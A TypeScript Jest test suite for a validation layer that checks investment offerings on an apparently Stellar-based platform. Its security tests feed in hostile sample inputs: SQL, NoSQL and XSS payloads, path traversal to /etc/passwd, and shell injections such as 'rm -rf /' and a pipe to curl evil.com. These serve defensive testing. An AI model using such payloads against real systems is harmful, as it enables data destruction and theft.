/**
 * @title Offering Validation Matrix Tests
 * @dev Comprehensive test suite for validation matrix with 95%+ coverage
 * 
 * Tests cover:
 * - Security validation (SQL injection, XSS, input sanitization)
 * - Business rule validation (field requirements, constraints)
 * - Technical validation (payload size, duplicates)
 * - Edge cases and error conditions
 * - Performance and abuse scenarios
 * - Authorization boundaries
 * - Stellar address validation
 * - Financial overflow protection
 * 
 * @author Stellar Wave Program
 * @version 1.0.0
 */

import { OfferingValidationMatrix, OfferingValidationContext, ValidationResult, ValidationError, ValidationWarning } from '../lib/validationMatrix';
import { User } from '../types';

describe('OfferingValidationMatrix', () => {
  let validationMatrix: OfferingValidationMatrix;
  let mockUser: User;
  let mockContext: OfferingValidationContext;

  beforeEach(() => {
    validationMatrix = new OfferingValidationMatrix();
    
    mockUser = {
      id: 'user-123',
      email: 'test@example.com',
      role: 'startup',
      created_at: new Date(),
      updated_at: new Date()
    };

    mockContext = {
      user: mockUser,
      requestPayload: {
        name: 'Test Offering',
        description: 'A test offering for validation',
        revenue_share_bps: 1000,
        token_asset_id: 'TESTTOKEN',
        status: 'draft'
      },
      operation: 'create',
      offeringData: {
        name: 'Test Offering',
        description: 'A test offering for validation',
        revenue_share_bps: 1000,
        token_asset_id: 'TESTTOKEN',
        status: 'draft'
      }
    };
  });

  describe('Security Validation', () => {
    describe('Input Sanitization', () => {
      it('should detect SQL injection patterns in offering name', async () => {
        mockContext.offeringData.name = "Test'; DROP TABLE offerings; --";
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'SQL_INJECTION_DETECTED',
              severity: 'critical',
              category: 'security'
            })
          ])
        );
      });

      it('should detect XSS patterns in description', async () => {
        mockContext.offeringData.description = '<script>alert("xss")</script>Malicious content';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'XSS_PATTERN_DETECTED',
              severity: 'critical',
              category: 'security'
            })
          ])
        );
      });

      it('should reject overly long offering names', async () => {
        mockContext.offeringData.name = 'a'.repeat(256);
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'FIELD_TOO_LONG',
              field: 'name',
              category: 'technical'
            })
          ])
        );
      });

      it('should warn about very long descriptions', async () => {
        mockContext.offeringData.description = 'a'.repeat(5001);
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
        expect(result.warnings).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'LONG_DESCRIPTION',
              field: 'description',
              category: 'performance'
            })
          ])
        );
      });
    });

    describe('Role Authorization', () => {
      it('should allow startup users to create offerings', async () => {
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
      });

      it('should reject non-startup users creating offerings', async () => {
        mockContext.user.role = 'investor';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'INSUFFICIENT_PRIVILEGES',
              severity: 'critical',
              category: 'security'
            })
          ])
        );
      });

      it('should reject invalid user authentication', async () => {
        mockContext.user.id = '';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'INVALID_USER',
              severity: 'critical',
              category: 'security'
            })
          ])
        );
      });
    });

    describe('Rate Limiting', () => {
      it('should warn about many existing offerings', async () => {
        const manyOfferings = Array.from({ length: 15 }, (_, i) => ({
          id: `offering-${i}`,
          name: `Offering ${i}`,
          issuer_user_id: mockUser.id
        }));
        
        mockContext.existingOfferings = manyOfferings;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
        expect(result.warnings).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'MANY_OFFERINGS',
              category: 'business'
            })
          ])
        );
      });
    });
  });

  describe('Business Rule Validation', () => {
    describe('Offering Name Validation', () => {
      it('should require offering name', async () => {
        mockContext.offeringData.name = '';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'NAME_REQUIRED',
              field: 'name',
              category: 'business'
            })
          ])
        );
      });

      it('should reject names that are too short', async () => {
        mockContext.offeringData.name = 'ab';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'NAME_TOO_SHORT',
              field: 'name',
              category: 'business'
            })
          ])
        );
      });

      it('should reject names with invalid characters', async () => {
        mockContext.offeringData.name = 'Test@Offering#123';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'INVALID_NAME_CHARS',
              field: 'name',
              category: 'business'
            })
          ])
        );
      });

      it('should accept valid names with allowed characters', async () => {
        mockContext.offeringData.name = 'Test-Offering_123.Test';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
      });
    });

    describe('Revenue Share Validation', () => {
      it('should reject invalid revenue share type', async () => {
        mockContext.offeringData.revenue_share_bps = 'invalid' as any;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'INVALID_REVENUE_SHARE_TYPE',
              field: 'revenue_share_bps',
              category: 'business'
            })
          ])
        );
      });

      it('should reject negative revenue share', async () => {
        mockContext.offeringData.revenue_share_bps = -100;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'REVENUE_SHARE_OUT_OF_RANGE',
              field: 'revenue_share_bps',
              category: 'business'
            })
          ])
        );
      });

      it('should reject revenue share over 100%', async () => {
        mockContext.offeringData.revenue_share_bps = 10001;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'REVENUE_SHARE_OUT_OF_RANGE',
              field: 'revenue_share_bps',
              category: 'business'
            })
          ])
        );
      });

      it('should warn about high revenue share', async () => {
        mockContext.offeringData.revenue_share_bps = 6000;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'HIGH_REVENUE_SHARE',
              field: 'revenue_share_bps',
              category: 'business'
            })
          ])
        );
      });

      it('should accept valid revenue share range', async () => {
        mockContext.offeringData.revenue_share_bps = 2500;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
      });
    });

    describe('Token Asset Validation', () => {
      it('should require token asset ID', async () => {
        mockContext.offeringData.token_asset_id = '';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'TOKEN_ASSET_REQUIRED',
              field: 'token_asset_id',
              category: 'business'
            })
          ])
        );
      });

      it('should reject overly long token asset IDs', async () => {
        mockContext.offeringData.token_asset_id = 'a'.repeat(256);
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'TOKEN_ASSET_TOO_LONG',
              field: 'token_asset_id',
              category: 'technical'
            })
          ])
        );
      });

      it('should reject invalid token formats', async () => {
        mockContext.offeringData.token_asset_id = 'INVALID-TOKEN!';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'INVALID_TOKEN_FORMAT',
              field: 'token_asset_id',
              category: 'business'
            })
          ])
        );
      });

      it('should accept valid Stellar asset codes', async () => {
        mockContext.offeringData.token_asset_id = 'USD';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
      });
    });

    describe('Status Transition Validation', () => {
      it('should allow valid status transitions', async () => {
        mockContext.operation = 'status_change';
        mockContext.offering = {
          id: 'offering-123',
          status: 'draft'
        };
        mockContext.offeringData.status = 'active';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
      });

      it('should reject invalid status transitions', async () => {
        mockContext.operation = 'status_change';
        mockContext.offering = {
          id: 'offering-123',
          status: 'closed'
        };
        mockContext.offeringData.status = 'active';
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'INVALID_STATUS_TRANSITION',
              field: 'status',
              category: 'business'
            })
          ])
        );
      });
    });
  });

  describe('Technical Validation', () => {
    describe('Payload Size Validation', () => {
      it('should reject overly large payloads', async () => {
        const largePayload = {
          data: 'x'.repeat(1024 * 1024 + 1) // 1MB + 1 byte
        };
        mockContext.requestPayload = largePayload;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'PAYLOAD_TOO_LARGE',
              category: 'technical'
            })
          ])
        );
      });

      it('should warn about large payloads', async () => {
        const largePayload = {
          data: 'x'.repeat(1024 * 1024 * 0.9) // 0.9MB
        };
        mockContext.requestPayload = largePayload;
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
        expect(result.warnings).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'LARGE_PAYLOAD',
              category: 'performance'
            })
          ])
        );
      });
    });

    describe('Duplicate Offering Check', () => {
      it('should detect duplicate offering names', async () => {
        const existingOffering = {
          id: 'existing-123',
          name: 'Test Offering',
          issuer_user_id: mockUser.id
        };
        mockContext.existingOfferings = [existingOffering];
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(false);
        expect(result.errors).toEqual(
          expect.arrayContaining([
            expect.objectContaining({
              code: 'DUPLICATE_OFFERING_NAME',
              field: 'name',
              category: 'business'
            })
          ])
        );
      });

      it('should allow same name from different users', async () => {
        const existingOffering = {
          id: 'existing-123',
          name: 'Test Offering',
          issuer_user_id: 'other-user-456'
        };
        mockContext.existingOfferings = [existingOffering];
        
        const result = await validationMatrix.validateOffering(mockContext);
        
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('Validation Matrix Engine', () => {
    it('should execute rules in priority order', async () => {
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.metadata.rulesApplied).toContain('input_sanitization');
      expect(result.metadata.rulesApplied).toContain('role_authorization');
      expect(result.metadata.rulesApplied).toContain('offering_name_validation');
    });

    it('should include execution metadata', async () => {
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.metadata.timestamp).toBeInstanceOf(Date);
      expect(result.metadata.validationType).toBe('offering_validation');
      expect(result.metadata.userId).toBe(mockUser.id);
      expect(result.metadata.executionTimeMs).toBeGreaterThanOrEqual(0);
      expect(result.metadata.rulesApplied).toHaveLength.greaterThan(0);
    });

    it('should fail fast on critical security errors', async () => {
      mockContext.offeringData.name = "Test'; DROP TABLE offerings; --";
      mockContext.offeringData.description = '<script>alert("xss")</script>';
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.severity === 'critical')).toBe(true);
    });

    it('should handle validation engine errors gracefully', async () => {
      // Add a rule that throws an error
      validationMatrix.addRule({
        name: 'error_rule',
        description: 'Rule that throws error',
        category: 'technical',
        priority: 100,
        isRequired: false,
        validate: async () => {
          throw new Error('Validation rule error');
        }
      });
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(false);
      expect(result.errors).toEqual(
        expect.arrayContaining([
          expect.objectContaining({
            code: 'VALIDATION_ENGINE_ERROR',
            category: 'technical'
          })
        ])
      );
    });
  });

  describe('Edge Cases and Boundary Conditions', () => {
    it('should handle empty offering data', async () => {
      mockContext.offeringData = {};
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(false);
      expect(result.errors.length).toBeGreaterThan(0);
    });

    it('should handle null and undefined values', async () => {
      mockContext.offeringData = {
        name: null,
        description: undefined,
        revenue_share_bps: null,
        token_asset_id: undefined
      } as any;
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(false);
    });

    it('should handle boundary values for revenue share', async () => {
      mockContext.offeringData.revenue_share_bps = 0;
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(true);
      
      mockContext.offeringData.revenue_share_bps = 10000;
      
      const result2 = await validationMatrix.validateOffering(mockContext);
      
      expect(result2.isValid).toBe(true);
    });

    it('should handle minimum valid name length', async () => {
      mockContext.offeringData.name = 'abc';
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(true);
    });

    it('should handle maximum valid token asset length', async () => {
      mockContext.offeringData.token_asset_id = 'a'.repeat(12);
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(true);
    });
  });

  describe('Performance and Abuse Scenarios', () => {
    it('should complete validation within reasonable time', async () => {
      const startTime = Date.now();
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      expect(duration).toBeLessThan(1000); // Should complete within 1 second
      expect(result.metadata.executionTimeMs).toBeLessThan(1000);
    });

    it('should handle concurrent validation requests', async () => {
      const promises = Array.from({ length: 10 }, () => 
        validationMatrix.validateOffering(mockContext)
      );
      
      const results = await Promise.all(promises);
      
      expect(results).toHaveLength(10);
      results.forEach(result => {
        expect(result).toHaveProperty('isValid');
        expect(result).toHaveProperty('errors');
        expect(result).toHaveProperty('warnings');
        expect(result).toHaveProperty('metadata');
      });
    });

    it('should handle malformed request payloads', async () => {
      mockContext.requestPayload = {
        name: { nested: 'object' },
        description: ['array', 'instead', 'of', 'string'],
        revenue_share_bps: 'not-a-number',
        token_asset_id: 12345
      };
      
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.isValid).toBe(false);
    });
  });

  describe('Enhanced Security Tests', () => {
    it('should detect NoSQL injection attempts', async () => {
      const nosqlAttacks = [
        '{$where: {name: "admin"}}',
        '{$ne: null}',
        '{$gt: ""}',
        '{$regex: ".*"}',
        '{$or: [{name: "admin"}]}'
      ];

      for (const attack of nosqlAttacks) {
        mockContext.offeringData.token_asset_id = attack;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'NOSQL_INJECTION_DETECTED')).toBe(true);
      }
    });

    it('should detect command injection attempts', async () => {
      const commandAttacks = [
        'test; rm -rf /',
        'name && cat /etc/passwd',
        'test | curl evil.com',
        'name $(whoami)'
      ];

      for (const attack of commandAttacks) {
        mockContext.offeringData.name = attack;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'COMMAND_INJECTION_DETECTED')).toBe(true);
      }
    });

    it('should detect path traversal attempts', async () => {
      const pathAttacks = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
      ];

      for (const attack of pathAttacks) {
        mockContext.offeringData.token_asset_id = attack;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'PATH_TRAVERSAL_DETECTED')).toBe(true);
      }
    });

    it('should detect dangerous characters', async () => {
      const dangerousInputs = ['test\x00', 'name\x0a', 'data\x0d', 'test\x1a'];

      for (const input of dangerousInputs) {
        mockContext.offeringData.name = input;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'DANGEROUS_CHARACTER_DETECTED')).toBe(true);
      }
    });
  });

  describe('Stellar Address Validation', () => {
    it('should validate Stellar asset codes', async () => {
      const validAssetCodes = ['USD', 'USDC', 'BTC', 'ETH', 'TEST123', 'ABCDEFGHIJKL'];

      for (const assetCode of validAssetCodes) {
        mockContext.offeringData.token_asset_id = assetCode;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(true);
      }
    });

    it('should validate Stellar public keys', async () => {
      const validPublicKeys = [
        'GABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMN',
        'GB7NYNSOES7THKZ5CAQJRP5SUA4Q5F2PO4N6G2DVPJ3PGL4K5Z4V6AM'
      ];

      for (const publicKey of validPublicKeys) {
        mockContext.offeringData.token_asset_id = publicKey;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.code === 'STELLAR_PUBLIC_KEY_FORMAT')).toBe(true);
      }
    });

    it('should validate contract addresses', async () => {
      const validAddresses = [
        '0x742d35Cc6634C0532925a3b8D4C9db96C4b4Db45',
        '0x1234567890123456789012345678901234567890'
      ];

      for (const address of validAddresses) {
        mockContext.offeringData.token_asset_id = address;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(true);
        expect(result.warnings.some(w => w.code === 'CONTRACT_ADDRESS_FORMAT')).toBe(true);
      }
    });

    it('should reject malformed Stellar addresses', async () => {
      const invalidAddresses = [
        'g123', // lowercase
        'GTOOLONGSTELLARPUBLICKEYTHATEXCEEDSLIMIT12345', // too long
        'GINVALIDCHARS!@#', // invalid characters
        'G12345', // too short
        '0xinvalid', // invalid hex
        'toolongassetcodeexceedinglimit' // > 12 chars
      ];

      for (const address of invalidAddresses) {
        mockContext.offeringData.token_asset_id = address;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
      }
    });
  });

  describe('Financial Overflow Protection', () => {
    it('should handle revenue share boundary values', async () => {
      const boundaryValues = [0, 1, 9999, 10000];

      for (const value of boundaryValues) {
        mockContext.offeringData.revenue_share_bps = value;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(true);
      }
    });

    it('should reject negative revenue share', async () => {
      mockContext.offeringData.revenue_share_bps = -1;
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'REVENUE_SHARE_NEGATIVE')).toBe(true);
      expect(result.errors.find(e => e.code === 'REVENUE_SHARE_NEGATIVE')?.severity).toBe('critical');
    });

    it('should reject revenue share over 100%', async () => {
      mockContext.offeringData.revenue_share_bps = 10001;
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'REVENUE_SHARE_OVERFLOW')).toBe(true);
      expect(result.errors.find(e => e.code === 'REVENUE_SHARE_OVERFLOW')?.severity).toBe('critical');
    });

    it('should reject non-integer revenue share', async () => {
      mockContext.offeringData.revenue_share_bps = 1000.5;
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'REVENUE_SHARE_NOT_INTEGER')).toBe(true);
    });

    it('should reject NaN and Infinity values', async () => {
      const invalidValues = [NaN, Infinity, -Infinity];

      for (const value of invalidValues) {
        mockContext.offeringData.revenue_share_bps = value;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'INVALID_REVENUE_SHARE_VALUE')).toBe(true);
        expect(result.errors.find(e => e.code === 'INVALID_REVENUE_SHARE_VALUE')?.severity).toBe('critical');
      }
    });

    it('should warn about high revenue share', async () => {
      mockContext.offeringData.revenue_share_bps = 6000; // 60%
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.warnings.some(w => w.code === 'HIGH_REVENUE_SHARE')).toBe(true);
    });

    it('should warn about low revenue share', async () => {
      mockContext.offeringData.revenue_share_bps = 50; // 0.5%
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.warnings.some(w => w.code === 'LOW_REVENUE_SHARE')).toBe(true);
    });

    it('should warn about suspicious revenue share values', async () => {
      const suspiciousValues = [9999, 999, 99, 9];

      for (const value of suspiciousValues) {
        mockContext.offeringData.revenue_share_bps = value;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.warnings.some(w => w.code === 'SUSPICIOUS_REVENUE_SHARE')).toBe(true);
      }
    });
  });

  describe('Authorization Tests', () => {
    it('should reject offering creation by investor', async () => {
      mockUser.role = 'investor';
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'INSUFFICIENT_PRIVILEGES')).toBe(true);
      expect(result.errors.find(e => e.code === 'INSUFFICIENT_PRIVILEGES')?.severity).toBe('critical');
    });

    it('should reject offering creation by admin', async () => {
      mockUser.role = 'admin';
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'INSUFFICIENT_PRIVILEGES')).toBe(true);
    });

    it('should reject operations without user ID', async () => {
      mockUser.id = '';
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'INVALID_USER')).toBe(true);
      expect(result.errors.find(e => e.code === 'INVALID_USER')?.severity).toBe('critical');
    });
  });

  describe('Status Transition Tests', () => {
    it('should allow valid status transitions', async () => {
      const validTransitions = [
        { from: 'draft', to: 'active' },
        { from: 'draft', to: 'closed' },
        { from: 'active', to: 'paused' },
        { from: 'active', to: 'closed' },
        { from: 'paused', to: 'active' },
        { from: 'paused', to: 'closed' }
      ];

      for (const transition of validTransitions) {
        mockContext.operation = 'status_change';
        mockContext.offering = { id: 'test', status: transition.from };
        mockContext.offeringData.status = transition.to;
        
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(true);
      }
    });

    it('should reject invalid status transitions', async () => {
      const invalidTransitions = [
        { from: 'draft', to: 'paused' },
        { from: 'active', to: 'draft' },
        { from: 'paused', to: 'draft' },
        { from: 'closed', to: 'active' },
        { from: 'closed', to: 'paused' },
        { from: 'closed', to: 'draft' }
      ];

      for (const transition of invalidTransitions) {
        mockContext.operation = 'status_change';
        mockContext.offering = { id: 'test', status: transition.from };
        mockContext.offeringData.status = transition.to;
        
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.code === 'INVALID_STATUS_TRANSITION')).toBe(true);
      }
    });
  });

  describe('Payload Size Tests', () => {
    it('should reject extremely large payloads', async () => {
      mockContext.requestPayload = { data: 'A'.repeat(2 * 1024 * 1024) }; // 2MB
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'PAYLOAD_TOO_LARGE')).toBe(true);
    });

    it('should warn about large payloads', async () => {
      mockContext.requestPayload = { data: 'A'.repeat(900 * 1024) }; // 900KB
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.warnings.some(w => w.code === 'LARGE_PAYLOAD')).toBe(true);
    });
  });

  describe('Field Length Tests', () => {
    it('should reject overly long names', async () => {
      mockContext.offeringData.name = 'A'.repeat(256);
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'FIELD_TOO_LONG')).toBe(true);
    });

    it('should warn about long descriptions', async () => {
      mockContext.offeringData.description = 'A'.repeat(6000);
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.warnings.some(w => w.code === 'LONG_DESCRIPTION')).toBe(true);
    });

    it('should reject overly long token asset IDs', async () => {
      mockContext.offeringData.token_asset_id = 'A'.repeat(256);
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'TOKEN_ASSET_TOO_LONG')).toBe(true);
    });
  });

  describe('Duplicate Detection Tests', () => {
    it('should detect duplicate offering names', async () => {
      mockContext.existingOfferings = [
        { id: 'existing', name: 'Test Offering', issuer_user_id: 'user-123' }
      ];
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'DUPLICATE_OFFERING_NAME')).toBe(true);
    });

    it('should allow same name from different user', async () => {
      mockContext.existingOfferings = [
        { id: 'existing', name: 'Test Offering', issuer_user_id: 'different-user' }
      ];
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(true);
    });
  });

  describe('Error Handling Tests', () => {
    it('should handle rule execution errors gracefully', async () => {
      const faultyMatrix = new OfferingValidationMatrix();
      faultyMatrix.addRule({
        name: 'faulty_rule',
        description: 'A rule that always fails',
        category: 'technical',
        priority: 1,
        isRequired: false,
        validate: async () => {
          throw new Error('Rule execution failed');
        }
      });

      const result = await faultyMatrix.validateOffering(mockContext);
      expect(result.errors.some(e => e.code === 'VALIDATION_ENGINE_ERROR')).toBe(true);
    });

    it('should provide comprehensive metadata', async () => {
      mockContext.requestPayload.requestId = 'test-123';
      const result = await validationMatrix.validateOffering(mockContext);
      
      expect(result.metadata.timestamp).toBeInstanceOf(Date);
      expect(result.metadata.validationType).toBe('offering_validation');
      expect(result.metadata.userId).toBe('user-123');
      expect(result.metadata.requestId).toBe('test-123');
      expect(result.metadata.executionTimeMs).toBeGreaterThan(0);
      expect(result.metadata.rulesApplied.length).toBeGreaterThan(0);
    });
  });

  describe('Performance Tests', () => {
    it('should handle concurrent validations', async () => {
      const contexts = Array.from({ length: 10 }, (_, i) => ({
        ...mockContext,
        requestPayload: { requestId: `test-${i}` },
        offeringData: {
          name: `Test Offering ${i}`,
          token_asset_id: `TEST${i}`
        }
      }));

      const startTime = Date.now();
      const results = await Promise.all(
        contexts.map(context => validationMatrix.validateOffering(context))
      );
      const endTime = Date.now();

      expect(results).toHaveLength(10);
      expect(results.every(r => r.isValid)).toBe(true);
      expect(endTime - startTime).toBeLessThan(1000);
    });
  });

  describe('Edge Cases', () => {
    it('should handle minimum valid name length', async () => {
      mockContext.offeringData.name = 'ABC'; // Exactly 3 chars
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(true);
    });

    it('should handle maximum valid asset code length', async () => {
      mockContext.offeringData.token_asset_id = 'ABCDEFGHIJKL'; // Exactly 12 chars
      const result = await validationMatrix.validateOffering(mockContext);
      expect(result.isValid).toBe(true);
    });

    it('should handle suspicious token names', async () => {
      const suspiciousNames = ['admin', 'root', 'system', 'config', 'test'];
      
      for (const name of suspiciousNames) {
        mockContext.offeringData.token_asset_id = name;
        const result = await validationMatrix.validateOffering(mockContext);
        expect(result.warnings.some(w => w.code === 'SUSPICIOUS_TOKEN_NAME')).toBe(true);
      }
    });
  });
});
